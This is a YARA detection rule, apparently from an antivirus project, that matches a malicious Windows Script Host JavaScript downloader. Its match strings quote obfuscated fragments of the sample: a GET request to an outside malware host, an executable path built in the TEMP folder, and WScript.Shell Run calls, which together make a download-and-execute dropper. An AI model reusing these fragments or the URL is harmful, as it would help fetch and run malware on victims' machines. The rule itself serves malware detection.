rule sig_20160329_ebb18001e6c1ba4e61d8477fbf0bc6ca {
  meta:
    description = "datamaliciousorder - file 20160329_ebb18001e6c1ba4e61d8477fbf0bc6ca.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ea7ba5677cbec27f4c047be26945533789499b330e0e9b92a23d5529be93e218"

  strings:
    $s1  = "function AN() {return wS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uP4vBqajmt.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[wD](t() * 11); if (Lp[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function fJ(i1, z){QJ = QJ * 1; return i1 - z;};" fullword ascii
    $s4  = "var wS = function j() {return WScript[IF](\"WScript.Shell\");}(), o = 11;" fullword ascii
    $s5  = "Lp[Z](\"GET\", \"http://cngfloristsundries.co.uk/mo4erp\", false);" fullword ascii
    $s6  = "function Bg(){return \"\" + b;};" fullword ascii
    $s7  = "function f(Y){wS[\"Run\"](Y, QJ, QJ);};" fullword ascii
    $s8  = "function UV() {return ((A == true) && (A == vr)) ? 1 : QJ;};" fullword ascii
    $s9  = "function t(){return 22;};" fullword ascii
    $s10 = "return fJ(W0, v);" fullword ascii
    $s11 = "function f0(){return IF;};" fullword ascii
    $s12 = "var W = new this[\"Date\"]();" fullword ascii
    $s13 = "function zy()" fullword ascii
    $s14 = " while (LH){" fullword ascii
    $s15 = "function i(po) {var Ct = (1, 2, 3, 4, 5, po); return Ct;};" fullword ascii
    $s16 = "A = true; " fullword ascii
    $s17 = "var vr = false;" fullword ascii
    $s18 = "vr = true; " fullword ascii
    $s19 = "} catch(Qx){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}